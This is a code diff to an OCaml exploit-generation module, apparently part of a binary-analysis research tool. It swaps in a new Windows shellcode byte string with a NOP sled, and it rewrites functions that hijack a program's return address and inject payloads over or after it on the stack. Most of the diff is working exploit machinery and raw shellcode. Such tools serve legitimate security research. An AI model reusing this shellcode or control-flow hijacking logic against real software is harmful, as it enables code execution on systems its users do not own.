@@ -1299,38 +1299,22 @@ let shellcode =
 
 (* Windows shellcode to run an advanced math system *)
 let winshellcode =
-  (* "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc" *)
-  (* ^ "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78" *)
-  (* ^ "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85" *)
-  (* ^ "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5" *)
-  (* ^ "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c" *)
-  (* ^ "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21" *)
-  (* ^ "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5" *)
-  (* ^ "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27" *)
-  (* ^ "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3" *)
-  (* ^ "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53" *)
-  (* ^ "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f" *)
-  (* ^ "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6" *)
-  (* ^ "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8" *)
-  (* ^ "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" *)
-  (* ^ "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f" *)
-  (* ^ "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca" *)
-"\xd9\xc1\xd9\x74\x24\xf4\xbf\x0d\xbf\x3a\x41\x2b\xc9\x58\xb1"
-^ "\x34\x31\x78\x17\x03\x78\x17\x83\xcd\xbb\xd8\xb4\x31\x2b\x95"
-^ "\x37\xc9\xac\xc6\xbe\x2c\x9d\xd4\xa5\x25\x8c\xe8\xae\x6b\x3d"
-^ "\x82\xe3\x9f\xb6\xe6\x2b\x90\x7f\x4c\x0a\x9f\x80\x60\x92\x73"
-^ "\x42\xe2\x6e\x89\x97\xc4\x4f\x42\xea\x05\x97\xbe\x05\x57\x40"
-^ "\xb5\xb4\x48\xe5\x8b\x04\x68\x29\x80\x35\x12\x4c\x56\xc1\xa8"
-^ "\x4f\x86\x7a\xa6\x18\x3e\xf0\xe0\xb8\x3f\xd5\xf2\x85\x76\x52"
-^ "\xc0\x7e\x89\xb2\x18\x7e\xb8\xfa\xf7\x41\x75\xf7\x06\x85\xb1"
-^ "\xe8\x7c\xfd\xc2\x95\x86\xc6\xb9\x41\x02\xdb\x19\x01\xb4\x3f"
-^ "\x98\xc6\x23\xcb\x96\xa3\x20\x93\xba\x32\xe4\xaf\xc6\xbf\x0b"
-^ "\x60\x4f\xfb\x2f\xa4\x14\x5f\x51\xfd\xf0\x0e\x6e\x1d\x5c\xee"
-^ "\xca\x55\x4e\xfb\x6d\x34\x04\xfa\xfc\x42\x61\xfc\xfe\x4c\xc1"
-^ "\x95\xcf\xc7\x8e\xe2\xcf\x0d\xeb\x1d\x9a\x0c\x5d\xb6\x43\xc5"
-^ "\xdc\xdb\x73\x33\x22\xe2\xf7\xb6\xda\x11\xe7\xb2\xdf\x5e\xaf"
-^ "\x2f\xad\xcf\x5a\x50\x02\xef\x4e\x3e\xcb\x7b\x14\xcf\x72\xe0"
-^ "\xf8\x4a\x0c\x8d\x04\x9f"
+  "\xdb\xd6\xbf\x06\x5f\xcb\x1e\x2b\xc9\xb1\x33\xd9\x74\x24\xf4"
+  ^  "\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x12\xbd\x3e\xe2\xf2\xc8"
+  ^  "\xc1\x1b\x02\xab\x48\xfe\x33\xf9\x2f\x8a\x61\xcd\x24\xde\x89"
+  ^  "\xa6\x69\xcb\x1a\xca\xa5\xfc\xab\x61\x90\x33\x2c\x44\x1c\x9f"
+  ^  "\xee\xc6\xe0\x41\x22\x29\xd8\x2c\x37\x28\x1d\x50\xb7\x78\xf6"
+  ^  "\x1e\x65\x6d\x73\x62\xb5\x8c\x53\xe8\x85\xf6\xd6\x2f\x71\x4d"
+  ^  "\xd8\x7f\x29\xda\x92\x67\x42\x84\x02\x99\x87\xd6\x7f\xd0\xac"
+  ^  "\x2d\x0b\xe3\x64\x7c\xf4\xd5\x48\xd3\xcb\xd9\x45\x2d\x0b\xdd"
+  ^  "\xb5\x58\x67\x1d\x48\x5b\xbc\x5f\x96\xee\x21\xc7\x5d\x48\x82"
+  ^  "\xf9\xb2\x0f\x41\xf5\x7f\x5b\x0d\x1a\x7e\x88\x25\x26\x0b\x2f"
+  ^  "\xea\xae\x4f\x14\x2e\xea\x14\x35\x77\x56\xfb\x4a\x67\x3e\xa4"
+  ^  "\xee\xe3\xad\xb1\x89\xa9\xbb\x44\x1b\xd4\x85\x46\x23\xd7\xa5"
+  ^  "\x2e\x12\x5c\x2a\x29\xab\xb7\x0e\xc5\xe1\x9a\x27\x4d\xac\x4e"
+  ^  "\x7a\x10\x4f\xa5\xb9\x2c\xcc\x4c\x42\xcb\xcc\x24\x47\x90\x4a"
+  ^  "\xd4\x35\x89\x3e\xda\xea\xaa\x6a\xb9\x6d\x38\xf6\x10\x0b\xb8"
+  ^  "\x9d\x6c\xd9"
 
 let nop = '\x90'
 
@@ -1359,7 +1343,7 @@ let hijack_control target trace =
       
 (* Setting the return address to an arbitrary value *)
 let control_flow addr trace = 
-  let target = Int64.of_string ("0x"^addr) in
+  let target = Int64.of_string (addr) in
   let target = Int(target,reg_32) in
   let trace, assertion = hijack_control target trace in
     Util.fast_append trace [assertion]
@@ -1371,21 +1355,21 @@ let limited_control trace =
   let trace, assertion = hijack_control target trace in
     Util.fast_append trace [assertion]
 
+(** Return the last load expression *)
+let get_last_load_exp stmts = 
+  let rev = List.rev stmts in
+  let rec get_load = function
+    | [] -> failwith "no load found"
+    | (Ast.Move(_,Ast.Load(array,index,_,_),_))::rest ->
+	(array,index)
+    | s::rest -> 
+	get_load rest
+  in
+  get_load rev
+
 (* Injecting a payload at an offset past the return address *)
 let inject_payload start payload trace = 
   (* TODO: A simple dataflow is missing here *)
-  let get_last_load_exp stmts = 
-    let rev = List.rev stmts in
-    let rec get_load = function
-      | [] -> failwith "no load found"
-      | (Ast.Move(_,Ast.Load(array,index,_,_),_))::rest ->
-	  (array,index)
-      | s::rest -> 
-	  get_load rest
-    in
-      get_load rev
-  in
-  let _m, trace = get_last_jmp_exp trace in
   let mem, ind = get_last_load_exp trace in
   dprintf "Injecting shellcode at index: %s" (Pp.ast_exp_to_string ind);
    (* Let's convert to Int64 *)
@@ -1408,10 +1392,16 @@ let string_to_bytes payload =
       (fun c -> bytes := ((int_of_char c)::!bytes)) payload ;
     List.rev !bytes
 
-(* Add an arbitrary payload after the return address *)
-let add_payload payload trace = 
+(* Add an arbitrary payload over the return address *)
+let add_payload ?(offset=0L) payload trace = 
   let payload = string_to_bytes payload in
-  let trace, assertions = inject_payload 0L payload trace in
+  let _, trace = get_last_jmp_exp trace in
+  let trace, assertions = inject_payload offset payload trace in
+    Util.fast_append trace assertions
+
+let add_payload_after ?(offset=4L) payload trace = 
+  let payload = string_to_bytes payload in
+  let trace, assertions = inject_payload offset payload trace in
     Util.fast_append trace assertions
 
 (* Return a list of bytes read from a file *)
@@ -1426,36 +1416,31 @@ let bytes_from_file file =
     close_in cin;
     List.rev !bytes
 
-let add_payload_from_file file trace = 
+let add_payload_from_file ?(offset=0L) file trace = 
   let payload = bytes_from_file file in
-  let trace, assertions = inject_payload 0L payload trace in
+  let _, trace = get_last_jmp_exp trace in
+  let trace, assertions = inject_payload offset payload trace in
     Util.fast_append trace assertions
+
+let add_payload_from_file_after ?(offset=4L) file trace = 
+  let payload = bytes_from_file file in
+  let trace, assertions = inject_payload offset payload trace in
+    Util.fast_append trace assertions
+
+exception Found_load of Ast.exp
 
 (* Performing shellcode injection *)
 let inject_shellcode nops trace = 
-  let get_stack_address stmts = 
-    let rec get_addr = function
-      | [] -> failwith "could not get address"
-      | (Ast.Label (_,atts))::rest ->
-	  let conc = filter_taint atts in
-	    if conc = [] then get_addr rest
-	    else
-	      List.fold_left 
-		(fun addr {mem=mem;index=index} ->
-		   if mem then index
-		   else addr
-		) 0L conc  (* FIX: fail by default *)
-      | x::rest -> get_addr rest
-    in
-      get_addr (List.rev stmts)
-  in	  
-  let payload = (nopsled nops) ^ shellcode in
-  let target_addr = get_stack_address trace in
-  let target_addr = Int64.add target_addr pin_offset in
-  let target_addr = Int(target_addr, reg_32) in
-  let trace, assertion = hijack_control target_addr trace in
+  let payload = (nopsled nops) ^ winshellcode in
+  (* Find the expression of the last loaded value *)
+  let _,target_addr = get_last_load_exp trace in
+  let target_addr = BinOp(PLUS, target_addr, Int(4L, reg_32)) in
+  (* let target_addr = Int64.add target_addr pin_offset in *)
+  (* let target_addr = Int(target_addr, reg_32) in *)
+  let _, assertion = hijack_control target_addr trace in
   let payload = string_to_bytes payload in
-  let _, shell = inject_payload 4L payload trace in
+  let _, trace = get_last_jmp_exp trace in
+  let trace, shell = inject_payload 4L payload trace in
     Util.fast_append trace (shell @ [assertion])
 
 
